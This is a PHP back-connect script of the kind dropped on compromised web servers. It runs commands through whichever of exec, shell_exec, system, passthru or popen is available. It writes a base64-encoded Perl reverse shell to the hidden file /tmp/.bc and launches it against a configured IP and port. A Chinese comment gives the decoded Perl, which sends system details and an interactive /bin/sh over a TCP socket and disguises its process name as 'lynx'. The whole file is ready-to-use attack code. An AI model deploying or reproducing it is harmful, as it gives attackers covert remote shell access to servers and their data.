<?php
    function which($pr){ 
        $path = execute("which $pr"); 
        return ($path ? $path : $pr); 
    }
    function execute($cfe){ 
        $res = ''; 
        if ($cfe){ 
            if(function_exists('exec')){ 
                @exec($cfe,$res); 
                $res = join("\n",$res); 
            }
            elseif(function_exists('shell_exec')){ 
                $res = @shell_exec($cfe); 
            }
            elseif(function_exists('system')){
                @ob_start();
                @system($cfe);
                $res = @ob_get_contents();
                @ob_end_clean();
            }
            elseif(function_exists('passthru')){ 
            @ob_start(); 
            @passthru($cfe); 
            $res = @ob_get_contents(); 
            @ob_end_clean(); 
            }
            elseif(@is_resource($f = @popen($cfe,"r"))){ 
                $res = '';
                while(!@feof($f)){
                    $res .= @fread($f,1024);
                }
                @pclose($f);
            }
        }
        return $res; 
    } 
    function cf($fname,$text){
        if($fp=@fopen($fname,'w')) {
            @fputs($fp,@base64_decode($text));
            @fclose($fp);
        }
    }

    $yourip = "127.0.0.1";
    $yourport = '9999';
    $usedb = array('perl'=>'perl','c'=>'c');
  $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
    /*
    base64加密内容如下：
    #!/usr/bin/perl
    use Socket;
    $cmd= "lynx";
    $system= 'echo "`uname -a`";echo "`id`";/bin/sh';
    $0=$cmd;
    $target=$ARGV[0];
    $port=$ARGV[1];
    $iaddr=inet_aton($target) || die("Error: $!\n");
    $paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");
    $proto=getprotobyname('tcp');
    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
    connect(SOCKET, $paddr) || die("Error: $!\n");
    open(STDIN, ">&SOCKET");
    open(STDOUT, ">&SOCKET");
    open(STDERR, ">&SOCKET");
    system($system);
    close(STDIN);
    close(STDOUT);
    close(STDERR);
     */
    cf('/tmp/.bc',$back_connect);
    $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
?>